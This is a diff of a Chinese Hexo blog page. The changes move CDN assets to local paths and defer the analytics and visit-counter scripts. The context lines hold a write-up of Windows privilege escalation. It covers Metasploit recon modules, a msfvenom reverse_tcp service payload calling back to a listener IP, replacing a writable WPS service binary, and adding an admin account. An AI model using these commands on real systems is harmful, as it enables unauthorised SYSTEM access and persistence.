@@ -15,7 +15,11 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4"></script>
+<!--
+  gtag.js 从 googletagmanager.com 加载，该域名在中国大陆不可达；原来用 async 会一直挂住 window.load
+  （表现：页面一直转圈、Network 里那条请求长期 pending）。改为「等 load 之后再动态插入」。
+  上报不受影响，只是晚一点点；页面加载则完全不受第三方影响。
+-->
 <script>
     window.dataLayer = window.dataLayer || [];
     function gtag() {
@@ -24,27 +28,37 @@
 
     gtag('js', new Date());
     gtag('config', 'G-KYC8PY5RS4');
+    (function () {
+        function start() {
+            var s = document.createElement('script');
+            s.async = true;
+            s.src = 'https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4';
+            document.head.appendChild(s);
+        }
+        if (document.readyState === 'complete') { start(); }
+        else { window.addEventListener('load', start); }
+    })();
 </script>
 
 
     <title>记一次简单的win提权 | Yang Hao&#39;s blog</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
 
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
 	
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/my.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
 	
 	<!--prism-->
-	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.css">
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.js" async ></script>
+	<link rel="stylesheet" type="text/css" href="/libs/prism/prism.css">
+    <script src="/libs/prism/prism.js" async ></script>
 
 
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/jquery/jquery.min.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script>
 	<script src="/live2d-widget/autoload.js"></script>
 <meta name="generator" content="Hexo 5.4.2">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
@@ -59,7 +73,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">Yang Hao&#39;s blog</span>
                 </a>
@@ -157,7 +171,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
         <div class="logo-name">Yang Hao&#39;s blog</div>
         <div class="logo-desc">
@@ -265,7 +279,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -283,7 +297,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
 <style>
     #articleContent h1::before,
     #articleContent h2::before,
@@ -470,29 +484,29 @@ set EnableUnicodeEncoding true
 set AutoRunScript 'post/windows/manage/migrate' 
 run -j
 </code></pre>
-<p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p>
-<h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3 尝试提权"></a>3 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p>
-<p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p>
+<p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="/images/loli/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="/images/loli/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="/images/loli/2020/09/06/CpsugnLKoOMDT42.png"></p>
+<h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3 尝试提权"></a>3 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="/images/loli/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="/images/loli/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p>
+<p><img src="/images/loli/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p>
 <h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p>
 <pre><code class="line-numbers language-shell">use post/multi/recon/local_exploit_suggester
 </code></pre>
-<p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p>
-<p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p>
-<p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p>
+<p><img src="/images/loli/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="/images/loli/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p>
+<p><img src="/images/loli/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p>
+<p><img src="/images/loli/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p>
 <h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p>
 <pre><code class="line-numbers language-shell">use post/windows/gather/enum_services
 </code></pre>
-<p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这类服务的文件进行权限限制，同时任意用户可以对其服务进行重新启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code>cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p>
+<p><img src="/images/loli/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="/images/loli/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这类服务的文件进行权限限制，同时任意用户可以对其服务进行重新启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code>cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="/images/loli/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p>
 <p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p>
 <pre><code class="line-numbers language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe
 </code></pre>
-<p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p>
+<p><img src="/images/loli/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p>
 <pre><code class="line-numbers language-shell">upload /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"
 shell&gt;net start wpscloudsvr
 </code></pre>
-<p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p>
-<p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p>
-<p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p>
+<p><img src="/images/loli/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="/images/loli/2020/09/06/meE4iFVNKJnOBHf.png"></p>
+<p><img src="/images/loli/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="/images/loli/2020/09/06/orWRgGIUk7ZubB1.png"></p>
+<p><img src="/images/loli/2020/09/06/6omMlNKGb3QZUz2.png"></p>
 <h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p>
 <h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5 参考"></a>5 参考</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p>
 
@@ -570,12 +584,12 @@ shell&gt;net start wpscloudsvr
                     
                 </div>
                 <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/css/share.min.css">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
     <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/js/social-share.min.js"></script>
+    <script src="/libs/share/js/social-share.min.js"></script>
     
 
     
@@ -842,8 +856,8 @@ shell&gt;net start wpscloudsvr
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/av-min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/Valine.min.js"></script>
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
 <script>
     new Valine({
         el: '#vcomments',
@@ -875,7 +889,7 @@ shell&gt;net start wpscloudsvr
                 <a href="/2020/10/09/windows-ben-di-ti-quan-lou-dong-cve-2020-1313-fu-xian/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="Windows本地提权漏洞CVE-2020-1313复现">
+                        <img src="/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="Windows本地提权漏洞CVE-2020-1313复现">
                         
                         <span class="card-title">Windows本地提权漏洞CVE-2020-1313复现</span>
                     </div>
@@ -931,7 +945,7 @@ shell&gt;net start wpscloudsvr
                 <a href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="简单的源码免杀">
+                        <img src="/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="简单的源码免杀">
                         
                         <span class="card-title">简单的源码免杀</span>
                     </div>
@@ -1023,21 +1037,21 @@ shell&gt;net start wpscloudsvr
 
 
 <!-- 代码块功能依赖 -->
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 <!-- 代码语言 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeLang.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
 
 
 <!-- 代码块复制 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
 
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeShrink.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
 <!-- 代码块折行 -->
@@ -1061,7 +1075,7 @@ shell&gt;net start wpscloudsvr
 </div>
 
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.min.js"></script>
+<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
     $(function () {
         tocbot.init({
@@ -1293,10 +1307,10 @@ $(document).ready(function() {
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/search.js"></script>
+<script src="/js/search.js"></script>
 <script type="text/javascript">
 $(function () {
-    searchFunc("https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/search.xml", 'searchInput', 'searchResult');
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
 });
 </script>
 
@@ -1308,12 +1322,12 @@ $(function () {
 </div>
 
 	
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/matery.js"></script>
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
 
 
     <!-- Baidu Analytics -->
@@ -1323,14 +1337,13 @@ $(function () {
     
     
     <!--
-      不蒜子计数：原写法是 <script async src="...">。async 脚本同样会挂住 window.load，
-      一旦 busuanzi.ibruce.info 卡住，页面就一直转圈、Network 里那条请求长期 pending。
-      改成：先隐藏计数 → 等 load 之后再动态插入脚本 → 成功才由脚本自己显示出来。
-      这样页面加载完全不受第三方接口影响；接口不通时保持隐藏，不会留一个空标签。
+      访问计数：脚本等 window.load 之后再动态插入，任何第三方接口卡住都不影响页面加载。
+      后端见 source/js/counter.js —— 自建 Cloudflare Worker 优先，未配置/失败时回退 Vercount。
+      计数容器默认隐藏，拿到数字才显示，避免留一个「总访问量: 」空标签。
     -->
     <script>
         (function () {
-            var src = 'https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/others/busuanzi.pure.mini.js';
+            var src = '/js/counter.js';
             var keys = ['site_pv', 'page_pv', 'site_uv'];
             keys.forEach(function (k) {
                 var el = document.getElementById('busuanzi_container_' + k);
@@ -1359,7 +1372,7 @@ $(function () {
     
 
     
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
 </body>
